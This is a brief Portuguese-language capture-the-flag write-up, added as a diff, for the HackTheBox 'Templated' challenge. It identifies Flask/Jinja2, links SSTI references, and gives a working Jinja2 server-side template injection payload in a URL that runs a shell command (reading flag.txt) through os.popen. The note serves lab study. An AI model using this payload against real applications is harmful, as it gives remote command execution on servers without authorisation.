@@ -1,0 +1,7 @@
+Templated - Hackthebox
+
+Podemos ver que o site está usando o Flask/Jinja2, então pesquisando algumas POC e CVE, daria para achar tais links: 
+https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+https://site.com/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
